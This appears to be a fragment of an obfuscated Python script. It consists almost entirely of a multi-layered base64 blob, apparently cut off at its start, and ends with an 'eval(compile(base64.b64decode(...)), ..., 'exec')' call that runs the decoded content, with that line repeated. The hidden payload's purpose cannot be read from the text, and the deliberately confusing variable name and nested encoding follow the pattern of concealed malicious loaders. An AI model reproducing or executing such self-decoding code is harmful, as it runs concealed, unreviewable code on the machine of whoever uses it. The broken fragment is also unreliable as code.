NsRXdSbTVUVlU1Q1dqQk9jRkZYWkVwUk1FWnVVMVZPUWxveVRuUldha0pyVjBWd01WTlZhRTlpUjBwSVYxaFdhMDB3Y0hkYVJXUldZakZyZWxOWVRrcFRSbHAzVjJ0T00xb3lSbGhWYm5CTlVUQkpNMU5xVGs5TlJteFpWVzE0UzJWdE9XNVRha1pMWWtkTmVsRnVXbWxpVmtwM1YydGtSbUp0V2xSa01tUmFUV3BzTVZwRlpGZE9SMUpGVFZkd2FVMXFWWGRYYkdodlRVVjBVbUl3ZEVwUk1FWnVVMVZvVDJSdFNraGlSM0JvVjBaSmVGZHJVWGRhTVhCMFlrZDRhVkl4U2paVVJ6RnpaRmRTU0ZadE5XRlhSV3gyV2taT2ExWkhTWGxsU0VKYVRXMTNkMXBHWkZKaWEzaEVVVzVzWVZkRldYaFpWbWhMWWtad1JVMVZaRnBXTTJnMlYyeE9jbE13YkVSUlYyUktVakZ3YzFkVVNtOWhSbWQ2VTIxNFdrMXRlSEJWUms1RFlsZEdXRlp1VG1GVFJURXhWMnRrUjAxR2NGUmhSRVpMVFVad2MxZFVTbTloUld4SVZXMTRTbE5GY0hOWFZFcHpZVmRLTlZrelRrcFRSWEJ6V1RGb1YyTkhUblJXYlhSUlZsWndiMWxyYUU5aVJYaEVVVzEwWVZZeGNHOWFSbVEwVFVaQ1dGZHVRbUZXTTJoeVdUTnJNVkpXYkZsVmJYaE5ZbFUxTWxsdE5WTmlSMVpKVlcxYWExSjZiSEpYVm1oeVkwVk9jRkZYWkVwUk1FcHhXV3BPUzJWV2NGaFBWMXBhVFdwc01WZHRNWE5pYkdkNVlrZDBVVlV3U25SWlZtUlhZekZ3U1ZSWVZtbFdNRm94V2xaU1MyUnRTblJXVnpsTFRUQTFiMWRVVGt0aFJtZDVWRzVhYW1KcmNITlpha1UxWVcxSmVVNVhNV2hXTWs1MVZFVk9RMDFWYjNkVWJscHFZbXR3YzFsdWJHcGpNR3hJVDFoV1lWSXhXbnBYYkdoVFlrWkNWRnBIY0ZwWFJUVnhWMVprVTJKRmNEVmtNbVJxWWxaYU5GcEdaSE5sVm5CWVZWUnNVMkpWV25wWmVrcFdZMFZPY0ZGWFpFcFJNRW94V1dwSmVHRlhUblJXVkd4S1VqRndkMWRzWkRSaE1rNDFUbGR3YUZJd1dqVlRNR2hXWW14U2RFOVlVbHBpYTNCelV6Qm9UbU5GY0RWa01tUnFZbFphTkZwR1pITmxWbkJZVlZSc1UySlZXbnBaZWtwV1l6QnNTVlJ1UW14aVZsVTFWR3hTUW1ORlRuQlJWMlJLVVRCS2Ixa3daRmRqTWtwSVlrZDBhV1ZyVlRWVFZXUmhZMFp3V0dWSGRHcGxWRlp4V1ZWa1IyVlZkRWxXVnpWT1ZqRmFOVk5WWkVka01YQllaVWhPYUZZeFNqSlRibXd6V2pKT2RGWnVhR3RXTW5nMVYyeGtVazlXU25SU2JrNXFUV3hXZWxOVmFFOWpSMVowVmxSc1RtVnJiSGRSTW14Q1dqQnNSRkZ0YUdwU01WcDZXV3RrYzJFeVNqWlRWR3hLVWpGd2QxZHNaRFJoTWs0MVRsZHdhRkl3V2pWVE1HaFdZbXN4ZEZWdVdrcFNNRm96VjJ4a05HTXlSbGhWYmxwTFpWaGtibGt5TVZkbFIxSllZa2hzWVZZeFJUVlZiVEZIWXpKTmVWWllUa3BUUlRWM1dsY3hWazlWTVRaVFdFSkVZVlZHYmxOVlRrTmlWbkJZVkcwNVdsWnFiREZYVm1ST1QxVnNTRmR1UW1GV00yaHlXVE5yTVdFeGJGbFZiWGhNVTBaV2RWVnRNVmRoYlVaSVVsZGtZVkl4Vm01WmJURkhZVzFHV0UxWVFtRldlbFYzV1c1c2FtTXdiRWxUYlhocVYwWmFkMWt5TVZkaE1VSldWMjFvYVZORk5YTlRNVVoyV2pCc1JGRlhaR2xUUmxwMVYxWm9TMXB0U25SU2JYQlJWVEJLZEZsV1pGZGpNWEJKVkZoV1drMXRhRzlaTW14dlRWVnZkMlZFUm1GTmExbzFVMVZrVTJKRmJFaE9WMmhhVFcxNE1GbFdaRmRrVjFKSVQwYzFUVkV3U2pWWGJHaEhUVmRHV1ZOdGVHRlNSRVpJVjFaa05HVnNjRlJrTW1ScVRXMTNNbGRzVVhkTmF6VkVZVEIwU2xFd1JtNVRWV1JoWWtacmVXRkhhRmxOYXpVeVdXMHhZV05IVG5GTlIyUmhZbGQ0YzFsclpGTmxhM2gwVlcxb2ExSXhWblphUms1clVqRndXRlJ0T1ZwVk1FcHlWMnhrTTFveGEzbFBXRlpoWWxkNE5WbHNaRWRoYlVacVZETndhV0ZYVG5wVFZXaExZa2RPV1ZadVFtcGlWbHB5VlVaV1lXRkhTa2xVYlhoTVZWYzVibE5WVGtKYU1rMTZWVzFvYTFJeFZUVlRWV1JoWTBad1dHVkhkR3BsVkZZMlYyeGtOR0pHYTNwVmJrSnBUV3BTZGxZemJHNWliRlowVm0xd2FGWXdjSGRYYTJSR1ltdDRSRkZYTlZaaVZscHhXVlprUzJOR2NFaFNWelZNVlROa2RsTnFSa3RpUjAxNlVXNWFhV0pXU25kWGEyUkdZbXQ0UkZGWE5WWmlWbG8yV1RCak5XUldjRWhpUjNSYVZUSk9kMVJGV1hkak1HeEVXa1ZhYWsweFNtOVhhMk0wWW10NFJGRnVjR2hYU0VKelZVWlNSazFyZUVSUmJteGhWakJhY2xscVNURmpNbFpWVFZaV2FtSnNXbk5UTVVaMldqQnNSRkZYWkdwTk1VcHZXa1ZrVms5VmJFaFhia0poVmpOb2Nsa3phekZsYkhCWVpVZDRXazB4U25kWmFra3dZakZrTlZveU5WWmlWbHAxV1Zab1QwMUhUblJTYlhScFpWZE9lbE5xUmt0aVJtOTVZa2h3YTFORmNHOVhhMk0wWW10MFZHUXlPVXROUkZZeVUxVm9TMkpHYjNsaVNIQnJVMFZ3YjFkcll6UmlhM2hFV2tVNWFXVlZTalZYYkdSclkwZE5lbFZ1YkZwV01Vb3lVMjVzYzFwRmVFUlJWelZUVjBVMGQxZFdaRk5rYTNBMVpESmthbUpXV205WGEyTTFaRmRLU1dGNmJGZFRSVzk0VjJ4T00xb3hjRWhXYlRGYVYwWmFlbHBGVVhkaWJGWjBWbTF3YUZZd2NIZFhhMlJHWW10MFVtSXlaRXBSTUVadVdUSXhWMkpzWjNwVGJYaHFUVEJLYlZkWE5WZGxiVTVVVVZSc1NsSXhjSGRYYkdRMFlUSk9OVTVXVm1GWFIyZDNVekJPYTFaV2NGbGhSRUpwWlZWS05WZHNhRTlrTWxKWVZtNXdhMUl3Vm5WVE1VWjJVRk5KUzFwWVdtaGlRMmhxWWpJeGQyRlhlR3hMUjBwb1l6SlZNazVETldsT2FsSnJXbGRPZGxwSFZXOWlNRGxRVFVjNWRtSXdPVkJMVTNkblNXcDRlbVJJU25CaWJXTXJTV2wzWjBveVZqUmFWMDF1UzFOclBTSUtaWFpoYkNoamIyMXdhV3hsS0dKaGMyVTJOQzVpTmpSa1pXTnZaR1VvYjA5UE1HOXZiMDlQS1N3Z0lqeHpkSEpwYm1jK0lpd2dKMlY0WldNbktTaz0iCmV2YWwoY29tcGlsZShiYXNlNjQuYjY0ZGVjb2RlKG9PTzBvb29PTyksICI8c3RyaW5nPiIsICdleGVjJykp"
eval(compile(base64.b64decode(oOO0oooOO), "<string>", 'exec'))"
eval(compile(base64.b64decode(oOO0oooOO), "<string>", 'exec'))